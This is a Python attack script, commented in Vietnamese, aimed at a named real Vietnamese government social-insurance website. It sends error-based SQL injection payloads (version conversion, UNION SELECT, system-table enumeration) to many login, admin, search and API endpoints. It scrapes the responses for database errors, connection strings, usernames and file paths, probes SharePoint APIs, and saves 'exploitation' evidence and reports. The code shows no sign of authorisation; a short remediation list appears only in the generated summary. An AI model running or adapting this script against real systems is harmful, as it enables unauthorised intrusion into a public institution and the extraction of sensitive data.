#!/usr/bin/env python3
"""
Database Error Exploitation Script
Khai thác cụ thể lỗ hổng database error exposure để thu thập thông tin nhạy cảm
"""
import requests
import json
import time
import re
from datetime import datetime
import urllib.parse

class DatabaseErrorExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Connection': 'keep-alive'
        })
        
        self.target_base = "https://baohiemxahoi.gov.vn"
        self.evidence = []
        
    def test_database_error_exposure(self):
        """Khai thác lỗ hổng database error exposure đã phát hiện"""
        print("[*] Bắt đầu khai thác Database Error Exposure...")
        
        # Các endpoint có khả năng bị lỗi database
        vulnerable_endpoints = [
            "/",
            "/login",
            "/admin",
            "/api/user",
            "/search",
            "/portal",
            "/services",
            "/ekyc"
        ]
        
        # SQL payloads gây lỗi database cụ thể
        error_payloads = [
            "'",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' UNION SELECT 1,@@version,3,4,5--",
            "'; SELECT * FROM information_schema.tables--",
            "' AND (SELECT COUNT(*) FROM sysobjects)>0--",
            "' AND 1=CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS INT)--"
        ]
        
        for endpoint in vulnerable_endpoints:
            url = self.target_base + endpoint
            print(f"\n[*] Testing endpoint: {endpoint}")
            
            # Test GET parameters
            get_params = ['id', 'user', 'search', 'page', 'category']
            
            for param in get_params:
                for payload in error_payloads:
                    try:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        
                        print(f"[*] Testing: {param}={payload[:20]}...")
                        response = self.session.get(test_url, timeout=15)
                        
                        # Phân tích response để tìm database errors
                        self.analyze_database_errors(test_url, payload, response)
                        
                        time.sleep(1)  # Delay để tránh blocking
                        
                    except Exception as e:
                        print(f"[!] Error: {str(e)}")
                        continue
            
            # Test POST data
            post_data_sets = [
                {'username': '', 'password': ''},
                {'search': ''},
                {'id': ''},
                {'data': ''}
            ]
            
            for data_set in post_data_sets:
                for key in data_set.keys():
                    for payload in error_payloads:
                        try:
                            test_data = data_set.copy()
                            test_data[key] = payload
                            
                            print(f"[*] POST Testing: {key}={payload[:20]}...")
                            response = self.session.post(url, data=test_data, timeout=15)
                            
                            self.analyze_database_errors(url, payload, response, method='POST', data=test_data)
                            
                            time.sleep(1)
                            
                        except Exception as e:
                            continue
    
    def analyze_database_errors(self, url, payload, response, method='GET', data=None):
        """Phân tích response để tìm database errors và thu thập thông tin"""
        
        # Database error patterns cụ thể
        error_patterns = {
            'SQL Server': [
                r'Microsoft OLE DB Provider.*error',
                r'System\.Data\.SqlClient\.SqlException',
                r'Microsoft SQL Server.*error',
                r'ADODB\.Recordset.*error',
                r'SQLException.*Microsoft',
                r'SessionStateService.*database',
                r'BHXH\\sharepoint_portal'
            ],
            'MySQL': [
                r'mysql_fetch_array\(\)',
                r'mysql_num_rows\(\)',
                r'MySQL server version',
                r'supplied argument is not a valid MySQL',
                r'Column.*doesn\'t exist'
            ],
            'PostgreSQL': [
                r'pg_query\(\).*failed',
                r'PostgreSQL.*ERROR',
                r'pg_fetch_array\(\)',
                r'Warning.*pg_'
            ],
            'Oracle': [
                r'ORA-\d+',
                r'Oracle.*Error',
                r'oracle\.jdbc'
            ]
        }
        
        # Sensitive information patterns
        sensitive_patterns = {
            'Database Names': r'Database\s*[\'"]?([a-zA-Z0-9_]+)[\'"]?',
            'Table Names': r'Table\s*[\'"]?([a-zA-Z0-9_]+)[\'"]?',
            'Column Names': r'Column\s*[\'"]?([a-zA-Z0-9_]+)[\'"]?',
            'User Names': r'User\s*[\'"]?([a-zA-Z0-9\\@._-]+)[\'"]?',
            'File Paths': r'[C-Z]:[\\\\/](?:[^\\\\/:*?"<>|\r\n]+[\\\\/])*[^\\\\/:*?"<>|\r\n]*',
            'Connection Strings': r'(Data Source|Server|Database|User ID|Password)=([^;]+)',
            'SessionState Info': r'SessionStateService[_a-zA-Z0-9]*'
        }
        
        response_text = response.text
        found_errors = []
        found_sensitive = []
        
        # Tìm database errors
        for db_type, patterns in error_patterns.items():
            for pattern in patterns:
                matches = re.finditer(pattern, response_text, re.IGNORECASE | re.MULTILINE)
                for match in matches:
                    found_errors.append({
                        'database_type': db_type,
                        'pattern': pattern,
                        'match': match.group(0),
                        'position': match.start()
                    })
        
        # Tìm sensitive information
        for info_type, pattern in sensitive_patterns.items():
            matches = re.finditer(pattern, response_text, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                found_sensitive.append({
                    'type': info_type,
                    'value': match.group(1) if match.groups() else match.group(0),
                    'full_match': match.group(0)
                })
        
        # Nếu tìm thấy errors hoặc sensitive info
        if found_errors or found_sensitive:
            evidence_data = {
                'timestamp': datetime.now().isoformat(),
                'url': url,
                'method': method,
                'payload': payload,
                'post_data': data if method == 'POST' else None,
                'status_code': response.status_code,
                'response_length': len(response_text),
                'database_errors': found_errors,
                'sensitive_info': found_sensitive,
                'response_headers': dict(response.headers),
                'response_snippet': response_text[:3000]  # First 3000 chars
            }
            
            self.evidence.append(evidence_data)
            
            print(f"[!] DATABASE ERROR DETECTED!")
            print(f"    URL: {url}")
            print(f"    Payload: {payload}")
            
            if found_errors:
                print(f"    Database Errors Found: {len(found_errors)}")
                for error in found_errors[:3]:  # Show first 3
                    print(f"      - {error['database_type']}: {error['match'][:100]}...")
            
            if found_sensitive:
                print(f"    Sensitive Info Found: {len(found_sensitive)}")
                for info in found_sensitive[:3]:  # Show first 3
                    print(f"      - {info['type']}: {info['value']}")
            
            # Lưu evidence ngay lập tức
            self.save_evidence(evidence_data)
            
            return True
        
        return False
    
    def save_evidence(self, evidence_data):
        """Lưu bằng chứng database error"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"database_error_evidence_{timestamp}.json"
        
        with open(f"./evidence/exploits/{filename}", 'w', encoding='utf-8') as f:
            json.dump(evidence_data, f, indent=2, ensure_ascii=False)
        
        print(f"[+] Evidence saved: ./evidence/exploits/{filename}")
    
    def extract_sharepoint_info(self):
        """Khai thác thông tin SharePoint cụ thể"""
        print("\n[*] Extracting SharePoint specific information...")
        
        sharepoint_endpoints = [
            "/_layouts/viewlsts.aspx",
            "/_api/web/lists",
            "/_vti_bin/listdata.svc",
            "/sites/default/_api/web",
            "/_layouts/settings.aspx"
        ]
        
        for endpoint in sharepoint_endpoints:
            try:
                url = self.target_base + endpoint
                response = self.session.get(url, timeout=10)
                
                if response.status_code != 404:
                    sharepoint_evidence = {
                        'timestamp': datetime.now().isoformat(),
                        'endpoint': endpoint,
                        'status_code': response.status_code,
                        'headers': dict(response.headers),
                        'server_info': response.headers.get('Server', ''),
                        'sharepoint_version': response.headers.get('MicrosoftSharePointTeamServices', ''),
                        'response_preview': response.text[:2000]
                    }
                    
                    self.evidence.append(sharepoint_evidence)
                    self.save_evidence(sharepoint_evidence)
                    
                    print(f"[+] SharePoint endpoint accessible: {endpoint}")
                    print(f"    Status: {response.status_code}")
                    if response.headers.get('Server'):
                        print(f"    Server: {response.headers.get('Server')}")
                
                time.sleep(2)
                
            except Exception as e:
                continue
    
    def generate_exploitation_report(self):
        """Tạo báo cáo khai thác chi tiết"""
        if not self.evidence:
            print("[!] No evidence collected")
            return
        
        report = {
            'exploitation_summary': {
                'total_evidences': len(self.evidence),
                'exploitation_timeframe': {
                    'start': min(e['timestamp'] for e in self.evidence),
                    'end': max(e['timestamp'] for e in self.evidence)
                },
                'target': self.target_base,
                'exploitation_methods': list(set(e.get('method', 'GET') for e in self.evidence))
            },
            'vulnerabilities_exploited': [],
            'sensitive_data_extracted': [],
            'technical_details': self.evidence
        }
        
        # Phân loại vulnerabilities
        for evidence in self.evidence:
            if evidence.get('database_errors'):
                for error in evidence['database_errors']:
                    vuln = {
                        'type': 'Database Error Information Disclosure',
                        'database_type': error['database_type'],
                        'url': evidence['url'],
                        'payload': evidence['payload'],
                        'severity': 'HIGH',
                        'description': f"Database error exposed: {error['match'][:100]}..."
                    }
                    report['vulnerabilities_exploited'].append(vuln)
            
            if evidence.get('sensitive_info'):
                for info in evidence['sensitive_info']:
                    sensitive = {
                        'type': info['type'],
                        'value': info['value'],
                        'url': evidence['url'],
                        'extraction_method': evidence['payload'],
                        'risk_level': 'CRITICAL' if info['type'] in ['User Names', 'Database Names'] else 'HIGH'
                    }
                    report['sensitive_data_extracted'].append(sensitive)
        
        # Lưu báo cáo
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"./evidence/logs/exploitation_report_{timestamp}.json"
        
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        # Tạo summary
        summary = f"""
# BÁO CÁO KHAI THÁC DATABASE ERROR EXPOSURE

## Tóm tắt:
- **Target:** {self.target_base}
- **Số bằng chứng thu thập:** {len(self.evidence)}
- **Vulnerabilities exploited:** {len(report['vulnerabilities_exploited'])}
- **Sensitive data extracted:** {len(report['sensitive_data_extracted'])}

## Chi tiết khai thác:
"""
        
        for vuln in report['vulnerabilities_exploited'][:5]:  # Top 5
            summary += f"""
### {vuln['type']} ({vuln['severity']})
- **URL:** {vuln['url']}
- **Database:** {vuln['database_type']}  
- **Payload:** `{vuln['payload']}`
"""
        
        for sensitive in report['sensitive_data_extracted'][:5]:  # Top 5
            summary += f"""
### {sensitive['type']} Exposure ({sensitive['risk_level']})
- **Value:** {sensitive['value']}
- **URL:** {sensitive['url']}
"""
        
        summary += f"""
## Tác động:
- Lộ thông tin database structure
- Có thể dẫn đến SQL injection
- Thông tin user accounts bị lộ
- Cấu trúc hệ thống SharePoint bị lộ

## Khuyến nghị khắc phục:
1. Disable detailed error messages
2. Implement proper error handling
3. Use parameterized queries
4. Regular security audit
5. Update SharePoint security patches

**Báo cáo chi tiết:** {report_file}
"""
        
        with open(f"./evidence/EXPLOITATION_SUMMARY.md", 'w', encoding='utf-8') as f:
            f.write(summary)
        
        print(f"\n[+] Exploitation report saved: {report_file}")
        print(f"[+] Summary saved: ./evidence/EXPLOITATION_SUMMARY.md")
        
        return report
    
    def run_exploitation(self):
        """Chạy toàn bộ quá trình khai thác"""
        print("="*80)
        print("DATABASE ERROR EXPLOITATION STARTED")
        print("="*80)
        
        # 1. Test database error exposure
        self.test_database_error_exposure()
        
        # 2. Extract SharePoint info
        self.extract_sharepoint_info()
        
        # 3. Generate report
        report = self.generate_exploitation_report()
        
        print("="*80)
        print("EXPLOITATION COMPLETED")
        print(f"Total evidence collected: {len(self.evidence)}")
        print("="*80)
        
        return report

if __name__ == "__main__":
    exploiter = DatabaseErrorExploiter()
    exploiter.run_exploitation()
